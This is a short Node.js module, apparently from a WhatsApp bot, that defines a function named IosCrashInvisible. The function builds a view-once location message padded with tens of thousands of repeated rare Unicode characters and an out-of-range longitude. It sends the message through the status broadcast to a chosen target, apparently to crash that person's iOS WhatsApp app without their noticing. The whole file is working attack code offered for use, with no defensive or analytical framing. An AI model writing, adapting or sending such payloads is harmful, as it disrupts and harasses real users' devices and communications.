const { default: proto, makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function IosCrashInvisible(sock, target) {
    let msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "X" + "𑇂𑆵𑆴𑆿".repeat(15000),
            address: "X" + "𑇂𑆵𑆴𑆿".repeat(10000),
            url: `https://badzzprotofolio.my.id/${"𑇂𑆵𑆴𑆿".repeat(25000)}.php?vsp-apple-trash🍏`,
          }
        }
      }
    }, {});

    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: target
            },
            content: undefined
          }]
        }]
      }]
    });
}

module.exports = { IosCrashInvisible };
